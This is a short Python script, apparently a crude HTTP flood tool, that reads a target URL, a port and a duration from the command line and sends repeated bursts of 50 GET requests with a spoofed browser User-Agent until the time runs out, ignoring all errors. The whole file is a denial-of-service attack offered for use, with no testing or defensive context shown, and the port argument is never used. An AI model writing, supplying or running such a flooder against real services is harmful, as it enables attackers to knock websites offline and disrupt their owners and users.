import requests, sys, time
url = sys.argv[1]
port = sys.argv[2]
duration = int(sys.argv[3])
timeout = time.time() + duration

while time.time() < timeout:
    try:
        for _ in range(50):
            requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
    except:
        pass